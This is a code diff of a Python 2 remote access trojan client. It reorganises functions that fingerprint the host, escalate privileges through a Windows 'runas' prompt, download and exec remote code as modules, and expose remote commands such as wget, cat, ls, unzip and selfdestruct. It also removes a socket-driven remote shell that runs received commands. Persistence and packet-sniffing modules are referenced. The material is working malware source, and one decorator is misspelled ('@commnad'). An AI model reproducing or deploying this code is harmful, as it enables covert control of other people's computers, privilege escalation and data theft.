@@ -85,11 +85,11 @@ class Client(object):
     __command__ = {}
     __modules__ = {}
     def __init__(self, *args, **kwargs):
-        time.clock()
         [setattr(self, chr(i), kwargs.get(chr(i))) for i in range(97,123) if chr(i) in kwargs]
+        time.clock()
         self.mode       = 0
         self.exit       = 0
-        self.threads       = {}
+        self.threads    = {}
         self.cmds       = __command__
         self.mods       = __modules__
         self.info       = self._info()
@@ -232,6 +232,26 @@ class Client(object):
                 p.append(i)
         return str().join([block[i] for i in p])
 
+    def _use(self, module):
+        try:
+            getattr(self, module).status = True
+            return "'{}' enabled.".format(module.title())
+        except Exception as e:
+            if self.v:
+                print "Error: {}".format(str(e))
+
+    def _stop(self, module):
+        try:
+            getattr(self, module).status = False
+            return "'{}' disabled.".format(module.title())
+        except Exception as e:
+            if self.v:
+                print "Error: {}".format(str(e))
+
+    def _options(self, module=None):
+        modules = [_ for _ in self.mods] if not module else [module]
+        return self._show({m: m.options for m in modules})
+
     def _show(self, dict_or_json):
         try:
             results = json.dumps(dict_or_json, indent=2, separators=(',','\t'))
@@ -246,6 +266,42 @@ class Client(object):
                 results = repr(dict_or_json)
         return results
 
+
+    def _info(self, **args):
+        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
+
+    def _results(self):
+        return {module:{} for module in self.mods}
+
+    def _ip(self):
+        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
+        for target in sources:
+            try:
+                ip = request('GET', target).content
+                if socket.inet_aton(ip):
+                    return ip
+            except: pass
+
+    def _get_admin(self):
+        info = self.info()
+        if info['Admin']:
+            return {'User': info['login'], 'Administrator': info['admin']}
+        if self.f:
+            if os.name is 'nt':
+                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.f))))
+            else:
+                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
+
+    def _create_module_from_url(self, uri, name=None):
+        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
+        module  = new_module(name)
+        source  = request('GET', uri).content
+        code    = compile(source, name, 'exec')
+        exec code in module.__dict__
+        globals()[name] = module
+        sys.modules[name] = module
+        return module
+
     def _powershell(self, cmdline):
         try:
             info = subprocess.STARTUPINFO()
@@ -258,41 +314,6 @@ class Client(object):
         except Exception as e:
             if self.v:
                 print 'Powershell error: {}'.format(str(e))
-
-    def _ip(self):
-        sources = ['http://api.ipify.org','http://v4.ident.me','http://canihazip.com/s']
-        for target in sources:
-            try:
-                ip = request('GET', target).content
-                if socket.inet_aton(ip):
-                    return ip
-            except: pass
-
-    def _info(self, **args):
-        return {'IP Address': self._ip(),'Platform': sys.platform,'Localhost': socket.gethostbyname(socket.gethostname()),'MAC Address': '-'.join(uuid1().hex[20:].upper()[i:i+2] for i in range(0,11,2)),'Login': os.getenv('USERNAME') if os.name is 'nt' else os.getenv('USER'),'Machine': os.getenv('COMPUTERNAME') if os.name is 'nt' else os.getenv('NAME'),'Admin': bool(windll.shell32.IsUserAnAdmin()) if os.name is 'nt' else bool(os.getuid() == 0),'Device': subprocess.check_output('VER',shell=True).rstrip() if os.name is 'nt' else subprocess.check_output('uname -a', shell=True).rstrip()}
-
-    def _results(self):
-        return {module:{} for module in self.mods}
-
-    def _create_module_from_url(self, uri, name=None):
-        name    = os.path.splitext(os.path.basename(uri))[0] if not name else name
-        module  = new_module(name)
-        source  = request('GET', uri).content
-        code    = compile(source, name, 'exec')
-        exec code in module.__dict__
-        globals()[name] = module
-        sys.modules[name] = module
-        return module
-
-    def _get_admin(self):
-        info = self.info()
-        if info['Admin']:
-            return {'User': info['login'], 'Administrator': info['admin']}
-        if self.f:
-            if os.name is 'nt':
-                ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(self.f))))
-            else:
-                return "Privilege escalation on platform: '{}' is not yet available".format(sys.platform)
 
     def _logger(self, port=4321):
         module_logger = getLogger(self._ip())
@@ -742,63 +763,6 @@ class Client(object):
         fx.status = True if sys.platform in fx.platforms else False
         mx.update({fx.func_name: fx})
         return fx
-            
-    @command
-    def run_modules(self):
-        mods = [self.threads.update({ mod : Thread(target=getattr(self, mod), name=mod)}) for mod in self.mods if self.mods[mod].status if sys.platform in self.mods[mod].platforms if mod not in self.threads]
-        for module in mods:
-            self.threads[module].start()
-        if not self.mode:
-            return "Tasks complete."
-        
-    @command
-    def shell(self):
-        while True:
-            if self.mode:
-                break
-            prompt = "[%d @ {}]> ".format(os.getcwd())
-            self._send(prompt, method='prompt')   
-            data = self._receive()
-            cmd, _, action = data.partition(' ')
-
-            if cmd in self.cmds:
-                result = self.cmds[cmd](action) if len(action) else self.cmds[cmd]()
-            else:
-                result = bytes().join(subprocess.Popen(data, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-
-            if result and len(result):
-                result = '\n' + str(result) + '\n'
-                self._send(result, method=cmd)
-                
-    @command
-    def standby(self):
-        self.standby.next_run = time.time() + 300
-        while True:
-            if self.mode:
-                if time.time() > self.standby.next_run:
-                    self.run()
-                time.sleep(1)
-                b = self._receive()
-                self.mode = 0 if b else 1
-            else:
-                break
-        return self.shell()
-        
-    @command
-    def start(self):
-        try:
-            self.socket = self._connect(host=self._target(o=long(self.a), p=long(self.b)))
-            self.dhkey  = self._diffiehellman()
-            while True:
-                if self.exit:
-                    break
-                elif self.mode:
-                    self.standby()
-                else:
-                    self.shell()
-        except Exception as e:
-            if self.v:
-                print "Error: '{}'".format(str(e))
 
     @modules
     def persistence(self):
@@ -860,9 +824,24 @@ class Client(object):
         self.result['packetsniffer'].update({ time.ctime() : result })
         _ = self.threads.pop('packetsniffer', None)
         return result
+
+    @command
+    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
     
     @command
     def pwd(self): return os.getcwd()
+
+    @command
+    def wget(self, target): return urlretrieve(target)[0]
+    
+    @command
+    def cat(self,filename): return open(filename).read(4000) 
+
+    @command
+    def ls(self, path='.'): return '\n'.join(os.listdir(path))
+
+    @command
+    def unzip(self, fname): return ZipFile(fname).extractall('.')
 
     @command
     def run(self): return self.run_modules()
@@ -881,21 +860,6 @@ class Client(object):
 
     @command
     def results(self): return self._show(self.result)
-
-    @command
-    def selfdestruct(self): return self.self_destruct()
-    
-    @command
-    def wget(self, target): return urlretrieve(target)[0]
-    
-    @command
-    def cat(self,filename): return open(filename).read(4000) 
-
-    @command
-    def ls(self, path='.'): return '\n'.join(os.listdir(path))
-
-    @command
-    def unzip(self, fname): return ZipFile(fname).extractall('.')
     
     @command
     def modules(self): return '\n'.join([mod for mod in self.mods])
@@ -904,14 +868,19 @@ class Client(object):
     def commands(self): return '\n'.join([cmd for cmd in self.cmds])
 
     @command
-    def download_module(self,url): return self._create_module_from_url(url)
+    def download(self,url): return self._create_module_from_url(url)
 
     @command
-    def cd(self, pathname): return os.chdir(pathname) if os.path.isdir(pathname) else os.chdir('.')
+    def options(self,*arg): return self._options(arg[0]) if arg else self._options()
+
+    @commnad
+    def get(self, target): return getattr(self, target)() if target in ('jobs','results','options','status','commands','modules','info') else '\n'.join(["usage: {:>16}".format("'get <option>'"), "options: {}".format("'jobs','results','options','status','commands','modules','info'")]) 
 
     @command    
     def status(self): return '%d days, %d hours, %d minutes, %d seconds' % (int(time.clock()/86400.0), int((time.clock()%86400.0)/3600.0), int((time.clock()%3600.0)/60.0), int(time.clock()%60.0))
 
+    @command
+    def selfdestruct(self): return self.self_destruct()
 
 
 # ----------------- MAIN --------------------------
